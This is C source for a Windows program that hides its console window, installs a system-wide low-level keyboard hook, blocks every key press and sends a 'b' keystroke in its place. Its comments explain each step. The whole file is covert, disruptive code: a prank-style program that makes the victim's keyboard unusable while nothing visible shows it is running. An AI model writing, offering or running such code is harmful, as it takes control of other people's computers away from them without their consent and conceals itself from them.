#include <stdio.h>
#include <stdlib.h>
#define _WIN32_WINNT 0x0500
#include <windows.h>

HHOOK keyboardHook;

//This function is called every time a keyboard event is registered
LRESULT __stdcall KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam){
    if (nCode >= 0){

    INPUT inputs[1]; //create an array of input structs (actually a single input struct) that will later be fed to the SendInput function
    //set values for the input struct
    inputs[0].type           = INPUT_KEYBOARD;
    inputs[0].ki.wScan       = 0;
    inputs[0].ki.dwFlags     = 0;
    inputs[0].ki.time        = 0;
    inputs[0].ki.dwExtraInfo = 0;

            if(wParam == WM_KEYDOWN){//check if the keyboad event is a keydown event
                    inputs[0].ki.wVk = 0x42;//replace the keycode in the input struct with 'b'
                    SendInput(1, inputs, sizeof(INPUT));//send input from the input struct
                    return 1;//here we return one in order to prevent the keyboard event from being processed by any other process

            }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


void SetHook(){ //this creates the keyboard hook
if (!(keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, NULL, 0))){
        puts("failed to create a keyboard hook :(");
}
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrefInstance, LPSTR lpCmdLine, int nCmdShhow){
    //hide the window
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window,0);

    SetHook();
    MSG msg;

    while(GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}
